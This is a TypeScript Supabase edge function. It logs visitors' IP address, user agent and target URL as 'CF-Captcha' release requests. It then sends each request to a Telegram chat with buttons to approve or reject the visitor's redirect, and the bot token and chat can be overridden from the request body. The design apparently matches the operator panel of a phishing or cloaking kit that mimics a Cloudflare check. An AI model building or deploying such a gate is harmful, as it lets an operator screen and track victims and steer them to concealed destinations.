import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { tgCall, tgChatIdEnv, tgOverrideFromBody } from "../_shared/telegram.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  try {
    const body = await req.json().catch(() => ({}));
    const { next_url = null, client_ua = null, client_ip = null } = body || {};
    const { chatId: chatOverride, token: tokenOverride } = tgOverrideFromBody(body);
    const supabase = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
    );

    const { data: row, error } = await supabase
      .from("captcha_requests")
      .insert({ next_url, client_ua, client_ip })
      .select("id, created_at")
      .single();
    if (error || !row) throw new Error(error?.message || "insert failed");

    const { data: settings } = await supabase
      .from("api_settings").select("telegram_chat_id").limit(1).maybeSingle();
    const chatId = chatOverride || (settings as any)?.telegram_chat_id || tgChatIdEnv();

    if (chatId) {
      const esc = (s: string) => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
      const t = new Date(row.created_at).toLocaleString("de-DE", { timeZone: "Europe/Berlin" });
      const text = [
        "🛡️ <b>CF-Captcha Freigabe angefragt</b>",
        `🕒 ${esc(t)}`,
        next_url ? `➡️ Ziel: <code>${esc(String(next_url))}</code>` : "",
        client_ip ? `🌐 IP: <code>${esc(String(client_ip))}</code>` : "",
        client_ua ? `🖥 <i>${esc(String(client_ua)).slice(0, 200)}</i>` : "",
        `🆔 <code>${row.id}</code>`,
      ].filter(Boolean).join("\n");

      const { json } = await tgCall("sendMessage", {
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "✅ Weiterleitung freigeben", callback_data: `captcha_ok|${row.id}` },
            { text: "❌ Ablehnen", callback_data: `captcha_no|${row.id}` },
          ]],
        },
      }, { token: tokenOverride });
      const mid = json?.result?.message_id;
      if (mid) {
        await supabase.from("captcha_requests").update({ tg_message_id: mid }).eq("id", row.id);
      }
    }

    return new Response(JSON.stringify({ id: row.id }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (e) {
    return new Response(JSON.stringify({ error: String((e as Error).message || e) }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
